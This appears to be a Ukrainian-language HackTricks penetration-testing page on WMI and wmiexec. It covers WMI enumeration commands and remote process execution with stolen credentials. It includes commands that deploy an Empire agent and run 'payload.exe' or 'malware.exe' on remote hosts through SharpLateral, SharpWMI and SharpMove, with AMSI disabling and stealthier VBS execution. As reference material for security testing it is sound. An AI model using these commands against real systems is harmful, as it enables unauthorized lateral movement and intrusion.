# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Пояснення принципу роботи

Процеси можна запускати на хостах, якщо відомі ім'я користувача та пароль або hash, використовуючи WMI. Команди виконуються через WMI за допомогою Wmiexec, що забезпечує можливість роботи в напівінтерактивному shell.

**dcomexec.py:** Використовуючи різні DCOM endpoints, цей script надає напівінтерактивний shell, подібний до wmiexec.py, з використанням об'єкта ShellBrowserWindow DCOM. Наразі підтримуються об'єкти MMC20. Application, Shell Windows і Shell Browser Window. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## Основи WMI

### Namespace

WMI має ієрархію, структуровану за принципом каталогів. Його контейнером верхнього рівня є \root, у якому організовано додаткові каталоги, що називаються namespaces.<sup>[[1]](#references)</sup>
Команди для перелічення namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Класи в межах простору імен можна перелічити за допомогою:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Класи**

Знання назви класу WMI, наприклад `win32_process`, і простору імен, у якому він знаходиться, є важливим для будь-якої операції WMI.  
Команди для виведення списку класів, що починаються з `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Виклик класу:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Методи

Методи, які є однією або кількома виконуваними функціями класів WMI, можна виконувати.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Перерахування WMI

### Стан служби WMI

Команди для перевірки працездатності служби WMI:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Інформація про систему та процеси

Збір інформації про систему та процеси через WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Для зловмисників WMI є потужним інструментом для збору конфіденційних даних про системи або домени.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Віддалене отримання конкретної інформації через WMI, наприклад про локальних адміністраторів або користувачів, які увійшли в систему, можливе за умови ретельного формування команд.

### **Ручне віддалене опитування WMI**

Приховане визначення локальних адміністраторів на віддаленій машині та користувачів, які увійшли в систему, можна виконати за допомогою спеціальних WMI-запитів. `wmic` також підтримує читання з текстового файлу для одночасного виконання команд на кількох вузлах.<sup>[[1]](#references)</sup>

Для віддаленого виконання процесу через WMI, наприклад розгортання агента Empire, використовується наведена нижче структура команди; успішне виконання позначається поверненим значенням `"0"`:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Цей процес демонструє можливості WMI для віддаленого виконання та переліку системної інформації, підкреслюючи його корисність як для системного адміністрування, так і для penetration testing.

## Автоматизовані інструменти

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Також можна використати **`wmiexec` з Impacket**.


## Посилання

- [1] [Використання облікових даних для отримання контролю над Windows-системами — частина 3 (WMI і WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Посібник для початківців із набору інструментів Impacket — частина 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
